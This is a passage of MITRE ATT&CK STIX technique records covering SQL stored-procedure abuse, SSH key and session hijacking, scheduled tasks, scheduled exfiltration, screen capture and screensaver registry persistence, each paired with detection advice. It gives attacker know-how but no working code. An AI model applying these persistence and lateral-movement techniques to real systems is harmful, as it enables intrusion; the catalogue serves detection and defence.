CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) \",\"external_references\":[{\"external_id\":\"T1505.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1505/001\"},{\"description\":\"Sutherland, S. (2016, March 7). Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures. Retrieved July 8, 2019.\",\"source_name\":\"NetSPI Startup Stored Procedures\",\"url\":\"https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/\"},{\"description\":\"Plakhov, A., Sitchikhin, D. (2019, August 22). Agent 1433: remote attack on Microsoft SQL Server. Retrieved September 4, 2019.\",\"source_name\":\"Kaspersky MSSQL Aug 2019\",\"url\":\"https://securelist.com/malicious-tasks-in-ms-sql-server/92167/\"},{\"description\":\"Microsoft. (2017, March 15). xp_cmdshell (Transact-SQL). Retrieved September 9, 2019.\",\"source_name\":\"Microsoft xp_cmdshell 2017\",\"url\":\"https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017\"},{\"description\":\"Microsoft. (2017, June 19). Common Language Runtime Integration. Retrieved July 8, 2019.\",\"source_name\":\"Microsoft CLR Integration 2017\",\"url\":\"https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration/common-language-runtime-integration-overview?view=sql-server-2017\"},{\"description\":\"Sutherland, S. (2017, July 13). Attacking SQL Server CLR Assemblies. Retrieved July 8, 2019.\",\"source_name\":\"NetSPI SQL Server CLR\",\"url\":\"https://blog.netspi.com/attacking-sql-server-clr-assemblies/\"}],\"id\":\"attack-pattern--f9e9365a-9ca2-4d9c-8e7c-050d73d1101a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-25T23:30:20.638Z\",\"name\":\"SQL Stored Procedures\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Carlos Borges, @huntingneo, CIP\",\"Lucas da Silva Pereira, @vulcanunsec, CIP\",\"Kaspersky\"],\"x_mitre_data_sources\":[\"Application logs\"],\"x_mitre_detection\":\"On a MSSQL Server, consider monitoring for xp_cmdshell usage.(Citation: NetSPI Startup Stored Procedures) Consider enabling audit features that can log malicious startup activities.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Windows\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:27:15.774Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\\n\\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.(Citation: SSH Secure Shell)\",\"external_references\":[{\"external_id\":\"T1021.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1021/004\"},{\"external_id\":\"CAPEC-555\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/555.html\"},{\"description\":\"SSH.COM. (n.d.). SSH (Secure Shell). Retrieved March 23, 2020.\",\"source_name\":\"SSH Secure Shell\",\"url\":\"https://www.ssh.com/ssh\"}],\"id\":\"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T23:43:46.977Z\",\"name\":\"SSH\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\",\"Process use of network\",\"Network protocol analysis\",\"Netflow/Enclave netflow\"],\"x_mitre_detection\":\"Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_system_requirements\":[\"An SSH server is configured and running.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-24T12:42:35.144Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user\'s home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\\n\\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse) (Citation: Cybereason Linux Exim Worm)\",\"external_references\":[{\"external_id\":\"T1098.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1098/004\"},{\"description\":\"ssh.com. (n.d.). Authorized_keys File in SSH. Retrieved June 24, 2020.\",\"source_name\":\"SSH Authorized Keys\",\"url\":\"https://www.ssh.com/ssh/authorized_keys/\"},{\"description\":\"Blachman, Y. (2020, April 22). Growing Abuse of SSH Keys: Commodity Malware Campaigns Now Equipped with SSH Capabilities. Retrieved June 24, 2020.\",\"source_name\":\"Venafi SSH Key Abuse\",\"url\":\"https://www.venafi.com/blog/growing-abuse-ssh-keys-commodity-malware-campaigns-now-equipped-ssh-capabilities\"},{\"description\":\"Cybereason Nocturnus. (2019, June 13). New Pervasive Worm Exploiting Linux Exim Server Vulnerability. Retrieved June 24, 2020.\",\"source_name\":\"Cybereason Linux Exim Worm\",\"url\":\"https://www.cybereason.com/blog/new-pervasive-worm-exploiting-linux-exim-server-vulnerability\"}],\"id\":\"attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-06-25T16:32:23.367Z\",\"name\":\"SSH Authorized Keys\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Tony Lambert, Red Canary\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Use file integrity monitoring to detect changes made to the <code>authorized_keys</code> file for each user on a system. Monitor for suspicious processes modifying the <code>authorized_keys</code> file.\\n\\nMonitor for changes to and suspicious processes modifiying <code>/etc/ssh/sshd_config</code>.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1184\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1184\"},{\"description\":\"Duarte, H., Morrison, B. (2012). (Mis)trusting and (ab)using ssh. Retrieved January 8, 2018.\",\"source_name\":\"Slideshare Abusing SSH\",\"url\":\"https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219\"},{\"description\":\"Adam Boileau. (2005, August 5). Trust Transience:  Post Intrusion SSH Hijacking. Retrieved December 19, 2017.\",\"source_name\":\"SSHjack Blackhat\",\"url\":\"https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf\"},{\"description\":\"Beuchler, B. (2012, September 28). SSH Agent Hijacking. Retrieved December 20, 2017.\",\"source_name\":\"Clockwork SSH Agent Hijacking\",\"url\":\"https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking\"},{\"description\":\"M.Léveillé, M. (2014, February 21). An In-depth Analysis of Linux/Ebury. Retrieved January 8, 2018.\",\"source_name\":\"Welivesecurity Ebury SSH\",\"url\":\"https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/\"}],\"id\":\"attack-pattern--c1b11bf7-c68e-4fbf-a95b-28efbe7953bb\",\"modified\":\"2020-02-25T19:00:50.826Z\",\"name\":\"SSH Hijacking\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-25T18:34:38.290Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may hijack a legitimate user\'s SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\\n\\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent\'s socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)\\n\\n[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\",\"external_references\":[{\"external_id\":\"T1563.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1563/001\"},{\"description\":\"Duarte, H., Morrison, B. (2012). (Mis)trusting and (ab)using ssh. Retrieved January 8, 2018.\",\"source_name\":\"Slideshare Abusing SSH\",\"url\":\"https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219\"},{\"description\":\"Adam Boileau. (2005, August 5). Trust Transience:  Post Intrusion SSH Hijacking. Retrieved December 19, 2017.\",\"source_name\":\"SSHjack Blackhat\",\"url\":\"https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf\"},{\"description\":\"Beuchler, B. (2012, September 28). SSH Agent Hijacking. Retrieved December 20, 2017.\",\"source_name\":\"Clockwork SSH Agent Hijacking\",\"url\":\"https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking\"},{\"description\":\"Hodgson, M. (2019, May 8). Post-mortem and remediations for Apr 11 security incident. Retrieved February 17, 2020.\",\"source_name\":\"Breach Post-mortem SSH Hijack\",\"url\":\"https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident\"}],\"id\":\"attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T23:11:24.682Z\",\"name\":\"SSH Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Anastasios Pingios\"],\"x_mitre_data_sources\":[\"Authentication logs\"],\"x_mitre_detection\":\"Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_system_requirements\":[\"SSH service enabled, trust relationships configured, established connections\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-11-27T14:58:00.429Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\\n\\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At (Windows)](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\\n\\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\",\"external_references\":[{\"external_id\":\"T1053.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1053/005\"},{\"description\":\"Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.\",\"source_name\":\"Twitter Leoloobeek Scheduled Task\",\"url\":\"https://twitter.com/leoloobeek/status/939248813465853953\"},{\"description\":\"Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.\",\"source_name\":\"TechNet Forum Scheduled Task Operational Setting\",\"url\":\"https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen\"},{\"description\":\"Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.\",\"source_name\":\"TechNet Scheduled Task Events\",\"url\":\"https://technet.microsoft.com/library/dd315590.aspx\"},{\"description\":\"Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.\",\"source_name\":\"Microsoft Scheduled Task Events Win10\",\"url\":\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-24T13:45:03.730Z\",\"name\":\"Scheduled Task\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\\\System32\\\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\\n\\nConfigure event logging for scheduled task creation and changes by enabling the \\\"Microsoft-Windows-TaskScheduler/Operational\\\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\\n\\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\\n\\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\\n\\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:46.977Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\\n\\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).\",\"external_references\":[{\"external_id\":\"T1053\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1053\"},{\"external_id\":\"CAPEC-557\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/557.html\"},{\"description\":\"Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016.\",\"source_name\":\"TechNet Task Scheduler Security\",\"url\":\"https://technet.microsoft.com/en-us/library/cc785125.aspx\"}],\"id\":\"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-24T13:45:04.006Z\",\"name\":\"Scheduled Task/Job\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Prashant Verma, Paladion\",\"Leo Loobeek, @leoloobeek\",\"Travis Smith, Tripwire\",\"Alain Homewood, Insomnia Security\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \\n\\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_effective_permissions\":[\"SYSTEM\",\"Administrator\",\"User\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Linux\",\"macOS\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-05-31T21:30:34.139Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\\n\\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).\",\"external_references\":[{\"external_id\":\"T1029\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1029\"}],\"id\":\"attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2020-03-28T00:26:48.769Z\",\"name\":\"Scheduled Transfer\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Netflow/Enclave netflow\",\"Process use of network\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:31:25.060Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\\n\",\"external_references\":[{\"external_id\":\"T1113\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1113\"},{\"external_id\":\"CAPEC-648\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/648.html\"},{\"description\":\"Microsoft. (n.d.). Graphics.CopyFromScreen Method. Retrieved March 24, 2020.\",\"source_name\":\"CopyFromScreen .NET\",\"url\":\"https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen?view=netframework-4.8\"},{\"description\":\"Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.\",\"source_name\":\"Antiquated Mac Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\"}],\"id\":\"attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-24T19:56:37.627Z\",\"name\":\"Screen Capture\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1180\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1180\"},{\"description\":\"Wikipedia. (2017, November 22). Screensaver. Retrieved December 5, 2017.\",\"source_name\":\"Wikipedia Screensaver\",\"url\":\"https://en.wikipedia.org/wiki/Screensaver\"},{\"description\":\"ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.\",\"source_name\":\"ESET Gazer Aug 2017\",\"url\":\"https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf\"}],\"id\":\"attack-pattern--2892b9ee-ca9f-4723-b332-0dc6e843a8ae\",\"modified\":\"2020-01-24T13:51:47.990Z\",\"name\":\"Screensaver\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T13:51:01.210Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\\\Windows\\\\System32\\\\</code>, and <code>C:\\\\Windows\\\\sysWOW64\\\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\\n\\nThe following screensaver settings are stored in the Registry (<code>HKCU\\\\Control Panel\\\\Desktop\\\\</code>) and could be manipulated to achieve persistence:\\n\\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\\n* <code>ScreenSaveActive</code> - set to \'1\' to enable the screensaver\\n* <code>ScreenSaverIsSecure</code> - set to \'0\' to not require a password to unlock\\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\\n\\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)\",\"external_references\":[{\"external_id\":\"T1546.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/002\"},{\"description\":\"Wikipedia. (2017, November 22). Screensaver. Retrieved December 5, 2017.\",\"source_name\":\"Wikipedia Screensaver\",\"url\":\"https://en.wikipedia.org/wiki/Screensaver\"},{\"description\":\"ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.\",\"source_name\":\"ESET Gazer Aug 2017\",\"url\":\"https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf\"}],\"id\":\"attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-23T12:23:04.955Z\",\"name\":\"Screensaver\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Bartosz Jerzman\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Windows Registry\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.\\n\\nTools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:51.733Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated. Please use [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) where appropriate.**\\n\\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.\\n\\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.\\n\\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)\",\"external_references\":[{\"external_id\":\"T1064\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1064\"},{\"description\":\"Metasploit. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Metasploit_Ref\",\"url\":\"http://www.metasploit.com\"},{\"description\":\"Veil Framework. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Veil_Ref\",\"url\":\"https://www.veil-framework.com/framework/\"},{\"description\":\"PowerSploit. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Powersploit\",\"url\":\"https://github.com/mattifestation/PowerSploit\"},{\"description\":\"Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting of National Security Think Tanks. Retrieved November 12, 2014.\",\"source_name\":\"Alperovitch 2014\",\"url\":\"https://blog.crowdstrike.com/deep-thought-chinese-targeting-national-security-think-tanks/\"},{\"description\":\"Felix. (2016, September). Analyzing Malicious Office Documents. Retrieved April 11, 2018.\",\"source_name\":\"Uperesia Malicious Office 